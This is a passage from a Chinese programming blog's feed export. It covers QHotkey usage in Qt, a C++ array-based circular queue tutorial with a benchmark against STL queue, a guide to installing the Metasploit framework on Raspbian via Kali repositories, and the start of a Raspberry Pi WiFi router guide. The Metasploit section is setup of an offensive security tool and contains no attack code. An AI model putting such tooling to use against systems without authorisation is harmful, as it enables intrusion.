<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">QHotkey</span> (QObject *parent=Q_NULLPTR)<br><span class="hljs-built_in">QHotkey</span> (<span class="hljs-keyword">const</span> QKeySequence &amp;shortcut, <span class="hljs-keyword">bool</span> autoRegister=<span class="hljs-literal">false</span>, QObject *parent=Q_NULLPTR)<br><span class="hljs-built_in">QHotkey</span> (Qt::Key key, Qt::KeyboardModifiers modifiers, <span class="hljs-keyword">bool</span> autoRegister=<span class="hljs-literal">false</span>, QObject *parent=Q_NULLPTR)<br><span class="hljs-built_in">QHotkey</span> (<span class="hljs-keyword">const</span> NativeShortcut &amp;shortcut, <span class="hljs-keyword">bool</span> autoRegister=<span class="hljs-literal">false</span>, QObject *parent=Q_NULLPTR)<br><span class="hljs-function"><span class="hljs-keyword">bool</span> 	<span class="hljs-title">setRegistered</span> <span class="hljs-params">(<span class="hljs-keyword">bool</span> registered)</span></span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> 	<span class="hljs-title">setShortcut</span> <span class="hljs-params">(<span class="hljs-keyword">const</span> QKeySequence &amp;shortcut, <span class="hljs-keyword">bool</span> autoRegister=<span class="hljs-literal">false</span>)</span></span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> 	<span class="hljs-title">setShortcut</span> <span class="hljs-params">(Qt::Key key, Qt::KeyboardModifiers modifiers, <span class="hljs-keyword">bool</span> autoRegister=<span class="hljs-literal">false</span>)</span></span><br></code></pre></div></td></tr></table></figure>
<p>有两种方法构造一个 QHotkey 对象：</p>
<p>1.提供一个 <strong>QKeySequence</strong> 对象，如果 QHotkey 构造函数第二个参数为 <strong>false</strong>，则必须调用 <strong>bool setRegistered (bool registered)</strong> 注册热键</p>
<figure class="highlight haxe"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs haxe">QHotkey *hotkey = <span class="hljs-keyword">new</span> <span class="hljs-type">QHotkey</span>&#123;QKeySequence(<span class="hljs-string">&quot;Ctrl+P&quot;</span>),<span class="hljs-literal">true</span>&#125;;<br></code></pre></div></td></tr></table></figure>
<p>2.提供<strong>Qt::Key和Qt::KeyboardModifiers</strong>，不过是通过<strong>setShortcut</strong>设置。如下</p>
<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">QHotkey *hotkey =<span class="hljs-keyword">new</span> QHotkey(this);hotkey-&gt;setShortcut(Qt::Key_A,Qt::ControlModifier,<span class="hljs-literal">true</span>);<br></code></pre></div></td></tr></table></figure>
<p>注册热键成功后就可以在槽函数<strong>QHotkey::activated</strong>中进行处理了</p>
<h3 id="结尾"><a class="markdownIt-Anchor" href="#结尾"></a> 结尾</h3>
<p>是不是很简单呢？</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构-队列</title>
    <url>/queue-cpp/</url>
    <content><![CDATA[<p>队列是一种先进先出(FIFO)的数据结构，与栈(后进先出LIFO)不同，但两者都是线性结构，因此可以用线性表去描述队列，本文主要是用数组去实现一个简单的队列</p>
<span id="more"></span>
<h3 id="队列"><a class="markdownIt-Anchor" href="#队列"></a> 队列</h3>
<p>对一个队列操作，只能从队首删除元素，队尾插入元素，因此我们可以定义两个队列元素指针front,back，用于跟踪队列首尾元素。<br />
C++ STL实现了队列数据结构，我们用时不可能立即手写一个队列，因而只需include头文件即可，不过对于队列这一数据结构原理还是要理解的</p>
<p>我们知道，队列可以用数组或链表实现，不过本文是以数组来讲述的因此较为简单</p>
<h4 id="插入"><a class="markdownIt-Anchor" href="#插入"></a> 插入</h4>
<p>队列插入一个元素时，先将队尾指针back+1，使其指向下一个空闲区<br />
域，然后在插入元素。复杂度为O(1)</p>
<h4 id="删除"><a class="markdownIt-Anchor" href="#删除"></a> 删除</h4>
<p>删除队首元素有两种策略</p>
<ol>
<li>直接整个数组左移一位，front不变，back向前移动一位。复杂度O(n)</li>
<li>数组不移动，front移动到下一位，back不变。复杂度O(1)</li>
</ol>
<p>显然删除操作情况1不能接受，然而对于删除操作情况2，会导致数组空间浪费，这是因为front指针之前的区域未能被利用，而back指针之后的区域显然不够(这里在没有考虑数组变增的情况下)。</p>
<p>如果将数组“串”起来怎样？事实上确实可以，这种数组叫环形数组，用此类型数组实现的队列称为<strong>循环队列</strong> 且其插入删除复杂度均为O(1)</p>
<p>环形数组表示队列通过下面公式实现:</p>
<blockquote>
<p>location(i)=(location(front)+i)%arrayLength</p>
</blockquote>
<p>如下图一个空队列，此时 front=back<br />
<img src="/uploads/images/data_structure/queue_cpp/01.png" alt="" /></p>
<p>当插入一个元素时，也有两种策略</p>
<blockquote>
<p>1.先移动back，后插入元素。那么front指向元素为&quot;空&quot;<br />
2.先插入元素，后移动back。那么back指向元素为&quot;空&quot;</p>
</blockquote>
<img src="/uploads/images/data_structure/queue_cpp/02.png" width="70%" height="70%">
<p>每次插入都需要判断 (back+1)%size == front ，为什么？我们知道，初始时front=back表示空队列，那么当插入元素数量达到数组长度此时front=back！这表示这个队列满的还是空的？因此我们预留一个位置，也就是队列不能插满。即</p>
<blockquote>
<p>front=back  空队列<br />
(back+1)%size = front 满队列</p>
</blockquote>
<img src="/uploads/images/data_structure/queue_cpp/03.png" width="70%" height="70%">
<p>如何获取队列中第n个元素在数组中的下标？<br />
假设front=10，back=4。<br />
<img src="/uploads/images/data_structure/queue_cpp/04.png" width="70%" height="70%"></p>
<p>因此我们用C++实现该循环队列</p>
<h3 id="队列实现"><a class="markdownIt-Anchor" href="#队列实现"></a> 队列实现</h3>
<p>队列抽象数据类型</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">QueueBase</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">QueueBase</span>()&#123;&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">push_back</span><span class="hljs-params">(<span class="hljs-keyword">const</span> T &amp;)</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">pop_front</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> T &amp; <span class="hljs-title">front</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> T &amp; <span class="hljs-title">back</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">empty</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>&#125;;<br></code></pre></div></td></tr></table></figure>
<p>之后在另外定义一个派生类继承QueueBase接口。<br />
我是按照策略2来插入元素的，代码如下</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">arrayQueue</span>&#123;</span><br><span class="hljs-keyword">private</span>:<br>    T *m_array;<br>    <span class="hljs-keyword">int</span> m_capacity;<br>    <span class="hljs-keyword">int</span> front;<br>    <span class="hljs-keyword">int</span> back;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">arrayQueue</span>(<span class="hljs-keyword">int</span> initCapacity=<span class="hljs-number">10</span>)&#123;<br>        m_capacity=initCapacity;<br>        m_array=<span class="hljs-keyword">new</span> T[m_capacity];<br>        front=<span class="hljs-number">0</span>;<br>        back=<span class="hljs-number">0</span>;<br>    &#125;<br>    ~<span class="hljs-built_in">arrayQueue</span>()&#123;<span class="hljs-keyword">delete</span> []m_array;&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">push_back</span><span class="hljs-params">(<span class="hljs-keyword">const</span> T &amp;)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">pop_front</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function">T &amp; <span class="hljs-title">Front</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> m_array[front];<br>    &#125;<br>    <span class="hljs-function">T &amp; <span class="hljs-title">Back</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> m_array[back<span class="hljs-number">-1</span>];<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">empty</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> front==back;&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(front&lt;back)<br>            <span class="hljs-keyword">return</span> back-front;<br>        <span class="hljs-keyword">else</span> <br>            <span class="hljs-keyword">return</span> back+m_capacity-front;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">changeLength</span><span class="hljs-params">(T* &amp;,<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">output</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">empty</span>())<span class="hljs-keyword">return</span>;<br>        <span class="hljs-comment">// 情况1</span><br>        <span class="hljs-keyword">if</span>(front&lt;back)&#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = front; i &lt; back; i++)&#123;<br>                cout&lt;&lt;<span class="hljs-string">&quot;[&quot;</span>&lt;&lt;i&lt;&lt;<span class="hljs-string">&quot;] &quot;</span>&lt;&lt;m_array[i]&lt;&lt;<span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>        <span class="hljs-comment">// 情况2</span><br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = front; i &lt; m_capacity; i++)&#123;<br>                cout&lt;&lt;<span class="hljs-string">&quot;[&quot;</span>&lt;&lt;i&lt;&lt;<span class="hljs-string">&quot;] &quot;</span>&lt;&lt;m_array[i]&lt;&lt;<span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; back; i++)&#123;<br>                cout&lt;&lt;<span class="hljs-string">&quot;[&quot;</span>&lt;&lt;i&lt;&lt;<span class="hljs-string">&quot;] &quot;</span>&lt;&lt;m_array[i]&lt;&lt;<span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-keyword">void</span> arrayQueue&lt;T&gt;::<span class="hljs-built_in">push_back</span>(<span class="hljs-keyword">const</span> T &amp;element)&#123;<br>    <span class="hljs-comment">// 满队列</span><br>    <span class="hljs-keyword">if</span>((back+<span class="hljs-number">1</span>)%m_capacity==front)&#123;<br>        <span class="hljs-comment">// 数组倍增</span><br>        <span class="hljs-built_in">changeLength</span>(m_array,m_capacity,m_capacity*<span class="hljs-number">2</span>);<br>        m_capacity*=<span class="hljs-number">2</span>;<br>    &#125;<br>    <span class="hljs-comment">// 按照策略2插入: 先插入元素，后移动back</span><br>    m_array[back]=element;<br>    <span class="hljs-comment">// 注意，此处不能直接 back++，这样做会使back超出数组长度从而导致数组访问越界</span><br>    <span class="hljs-comment">// 相反，(back+1)%m_capacity 会使back指针回到数组起始处继续插入</span><br>    back=(back+<span class="hljs-number">1</span>)%m_capacity;<br>&#125;<br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-keyword">void</span> arrayQueue&lt;T&gt;::<span class="hljs-built_in">pop_front</span>()&#123;<br>    <span class="hljs-comment">// 判空</span><br>    <span class="hljs-keyword">if</span>(back==front)<span class="hljs-keyword">return</span>;<br>    m_array[front].~<span class="hljs-built_in">T</span>();<br>    <span class="hljs-comment">// 同样这里也是控制front只能处于数组之间</span><br>    front=(front+<span class="hljs-number">1</span>)%<span class="hljs-keyword">this</span>-&gt;m_capacity;<br>&#125;<br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-keyword">void</span> arrayQueue&lt;T&gt;::<span class="hljs-built_in">changeLength</span>(T* &amp;array,<span class="hljs-keyword">int</span> oldLength,<span class="hljs-keyword">int</span> newLength)&#123;<br>    <span class="hljs-keyword">if</span>(newLength&lt;<span class="hljs-number">0</span>)<span class="hljs-keyword">return</span>;<br>    T* temp=<span class="hljs-keyword">new</span> T[newLength];<br>    <span class="hljs-comment">// 从有效元素开始复制</span><br>    <span class="hljs-keyword">if</span>(front&lt;back)<br>        <span class="hljs-comment">// 没有形成环</span><br>        std::<span class="hljs-built_in">copy</span>(array+front,array+back,temp);<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">// 形成环</span><br>        std::<span class="hljs-built_in">copy</span>(array+front,array+oldLength,temp);<br>        std::<span class="hljs-built_in">copy</span>(array,array+back,temp+oldLength-front);<br>        <span class="hljs-comment">// 重新设置front,back</span><br>        front=<span class="hljs-number">0</span>;<br>        back=oldLength<span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">delete</span> []array;<br>    array=temp;<br>&#125;   <br><br></code></pre></div></td></tr></table></figure>
<p>我认为比较难理解的是changeLength改变数组长度函数，其实用一张图表示就很简单了</p>
<img src="/uploads/images/data_structure/queue_cpp/05.png" width="70%" height="70%">
<h3 id="测试"><a class="markdownIt-Anchor" href="#测试"></a> 测试</h3>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    arrayQueue&lt;<span class="hljs-keyword">int</span>&gt;<span class="hljs-built_in">q</span>(<span class="hljs-number">5</span>);<br>    q.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">1</span>);<br>    q.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">2</span>);<br>    q.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">3</span>);<br>    q.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">4</span>);<br>    q.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">40</span>);<br>    q.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">400</span>);<br>    q.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">4000</span>);<br>    q.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">40000</span>);<br><br>    q.<span class="hljs-built_in">pop_front</span>();<br>    q.<span class="hljs-built_in">pop_front</span>();<br>    q.<span class="hljs-built_in">pop_front</span>();<br>    q.<span class="hljs-built_in">pop_front</span>();<br>    q.<span class="hljs-built_in">pop_front</span>();<br>    q.<span class="hljs-built_in">pop_front</span>();<br><br>    q.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">5</span>);<br>    q.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">6</span>);<br>    q.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">7</span>);<br>    q.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">8</span>);<br>    q.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">9</span>);<br><br>    q.<span class="hljs-built_in">output</span>();<br>    cout&lt;&lt;<span class="hljs-string">&quot;size: &quot;</span>&lt;&lt;q.<span class="hljs-built_in">size</span>()&lt;&lt;endl;<br>    cout&lt;&lt;<span class="hljs-string">&quot;front: &quot;</span>&lt;&lt;q.<span class="hljs-built_in">Front</span>()&lt;&lt;endl;<br>    cout&lt;&lt;<span class="hljs-string">&quot;back: &quot;</span>&lt;&lt;q.<span class="hljs-built_in">Back</span>()&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>输出</p>
<figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript"><span class="hljs-string">[6]</span> <span class="hljs-number">4000</span><br><span class="hljs-string">[7]</span> <span class="hljs-number">40000</span><br><span class="hljs-string">[8]</span> <span class="hljs-number">5</span><br><span class="hljs-string">[9]</span> <span class="hljs-number">6</span><br><span class="hljs-string">[0]</span> <span class="hljs-number">7</span><br><span class="hljs-string">[1]</span> <span class="hljs-number">8</span><br><span class="hljs-string">[2]</span> <span class="hljs-number">9</span><br>size: <span class="hljs-number">7</span><br>front: <span class="hljs-number">4000</span><br>back: <span class="hljs-number">9</span><br></code></pre></div></td></tr></table></figure>
<h3 id="stl-queue"><a class="markdownIt-Anchor" href="#stl-queue"></a> STL queue</h3>
<p>将自己写的arrayQueue和STL queue分别测试，看看谁快些，这里我仅仅测试了先插入完成后再删除。</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    arrayQueue&lt;<span class="hljs-keyword">int</span>&gt;q2;<br>    <span class="hljs-keyword">int</span> n=<span class="hljs-number">100000000</span>;<br>    CClock::<span class="hljs-built_in">start_timeclock</span>();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)&#123;<br>        q2.<span class="hljs-built_in">push_back</span>(i);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)&#123;<br>        q2.<span class="hljs-built_in">pop_front</span>();<br>    &#125;<br>    q2.<span class="hljs-built_in">output</span>();<br>    CClock::<span class="hljs-built_in">stop_timeclock</span>();<br>    <span class="hljs-keyword">auto</span> t1=CClock::<span class="hljs-built_in">time_duration</span>();<br><br>    CClock::<span class="hljs-built_in">start_timeclock</span>();<br>    queue&lt;<span class="hljs-keyword">int</span>&gt;q3;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)&#123;<br>        q3.<span class="hljs-built_in">push</span>(i);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)&#123;<br>        q3.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>    CClock::<span class="hljs-built_in">stop_timeclock</span>();<br>    <span class="hljs-keyword">auto</span> t2=CClock::<span class="hljs-built_in">time_duration</span>();<br><br>    cout&lt;&lt;<span class="hljs-string">&quot;arrayQueue: &quot;</span>&lt;&lt;t1&lt;&lt;endl;<br>    cout&lt;&lt;<span class="hljs-string">&quot;queue: &quot;</span>&lt;&lt;t2&lt;&lt;endl;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>输出结果，单位秒</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">arrayQueue</span>: <span class="hljs-number">2</span>.<span class="hljs-number">32446</span><br><span class="hljs-attribute">queue</span>: <span class="hljs-number">2</span>.<span class="hljs-number">63278</span><br></code></pre></div></td></tr></table></figure>
<p>不知道该如何表达…<br />
(⊙o⊙)…</p>
<h3 id="结尾"><a class="markdownIt-Anchor" href="#结尾"></a> 结尾</h3>
<p>bye~</p>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>DataStructures</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派安装Metasploit框架</title>
    <url>/rasppi-meatsploit/</url>
    <content><![CDATA[<p>Metasploit框架包含的大量的模块、插件，其强大的功能使得渗透变得不在是想象中的那么难。Kali Linux本身就自带了metasploit框架，当然了，有兴趣的可以在树莓派上安装 <a href="https://www.offensive-security.com/kali-linux-arm-images/">kali Linux</a> 。不过本文的重点是在raspbian上进行安装</p>
<span id="more"></span>
<h3 id="正文"><a class="markdownIt-Anchor" href="#正文"></a> 正文</h3>
<p>首先呢，当然是要连接到树莓派了。<br />
接着我们把以下更新源追加到 sources.list</p>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">deb http:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/raspbian/</span>raspbian/ stretch main contrib non-free rpi<br><span class="hljs-comment">#deb-src http://mirrors.ustc.edu.cn/raspbian/raspbian/ stretch main contrib non-free rpi</span><br><span class="hljs-comment">##### 所需的有关kali linux更新源</span><br>deb http:<span class="hljs-regexp">//</span>http.kali.org/kali kali-rolling main non-free contrib<br>deb-src http:<span class="hljs-regexp">//</span>http.kali.org/kali kali-rolling main non-free contrib<br></code></pre></div></td></tr></table></figure>
<p>再 <code>sudo apt-get update</code> ，如果在这时出现了类似一下的错误，那么是正常的，因为我们没有授权在raspbian系统上使用kali的更新源</p>
<blockquote>
<p>正在读取软件包列表… 完成<br />
W: GPG 错误：<a href="http://kali.mirror.garr.it/mirrors/kali">http://kali.mirror.garr.it/mirrors/kali</a> kali-rolling InRelease: 由于没有公钥，无法验证下列签名： NO_PUBKEY <strong>ED444FF07D8D0BF6</strong><br />
W: 仓库 “<a href="http://http.kali.org/kali">http://http.kali.org/kali</a> kali-rolling InRelease” 没有数字签名。<br />
N: 无法认证来自该源的数据，所以使用它会带来潜在风险。<br />
N: 参见 apt-secure(8) 手册以了解仓库创建和用户配置方面的细节</p>
<p><strong>解决方法：</strong><br />
<strong>gpg --keyserver <a href="http://pgp.mit.edu">pgp.mit.edu</a> --recv-keys ED444FF07D8D0BF6</strong><br />
gpg -a --export <strong>ED444FF07D8D0BF6</strong> | sudo apt-key add -</p>
</blockquote>
<p>其中 --keyserver 后面的 <a href="http://pgp.mit.edu">pgp.mit.edu</a> 可换成：</p>
<blockquote>
<p><a href="http://keyserver.ubuntu.com">keyserver.ubuntu.com</a><br />
<a href="http://pgp.mit.edu">pgp.mit.edu</a><br />
<a href="http://subkeys.pgp.net">subkeys.pgp.net</a><br />
<a href="http://www.gpg-keyserver.de">www.gpg-keyserver.de</a></p>
</blockquote>
<p>然后在执行 <code>sudo apt-get update</code></p>
<p>接下来我们就可以安装metasploit框架了</p>
<blockquote>
<p>sudo apt-get install metasploit-framework</p>
</blockquote>
]]></content>
      <categories>
        <category>RaspberryPi</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派搭建简略WiFi无线路由器</title>
    <url>/raspberry-wifi-router/</url>
    <content><![CDATA[<p>目前我家有装有倆路由器，所以在搞一个觉得有点……<br />
然而本文介绍用树莓派来搭建一个简略的WiFi无线路由器，来体验树莓派的强大功能。</p>
<span id="more"></span>
<p>PS： 更新时间: 2019-08-13 21:13</p>
<h3 id="安装环境"><a class="markdownIt-Anchor" href="#安装环境"></a> 安装环境</h3>
<p>用一根网线连接路由器和树莓派，用于提供网络<br />
无线网卡，这里我用很久以前买的那个360随身WiFi(悲催)<br />
主机：Archlinux，树莓派<br />
工具：hostapd，dnsmasq，iptables</p>
<h3 id="树莓派配置信息"><a class="markdownIt-Anchor" href="#树莓派配置信息"></a> 树莓派配置信息</h3>
<p>插入网线网卡用网线连接好树莓派后开机，并在本机上ssh远程连接树莓派。<br />
以下是树莓派的一些配置信息，其中wlan1就是外置无线接口。</p>
<p>// 我本来是想将无线接口wlan1的IP配置成静态地址，而wlan0接入因特网。但现在我用网线连接到树莓派所以干脆把树莓派作为第二个路由器。</p>
